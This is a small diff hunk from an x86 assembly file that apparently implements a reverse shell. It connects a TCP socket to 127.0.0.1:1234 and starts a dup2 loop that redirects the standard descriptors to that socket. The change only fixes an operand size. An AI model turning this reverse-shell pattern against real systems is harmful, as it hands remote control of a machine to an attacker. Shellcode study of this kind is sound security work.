@@ -61,7 +61,7 @@ main:
 
     sock.socket AF_INET, SOCK_STREAM
     mov dword [ebp-4], eax
-    sock.connect dword [ebp-4], AF_INET, 0x0101017F, 0xD204	; 127.0.0.1, 1234s
+    sock.connect dword [ebp-4], AF_INET, dword 0x0101017F, 0xD204	; 127.0.0.1, 1234s
     mov ecx, 2
 .dup_loop:
     sys.dup2 [ebp-4], ecx
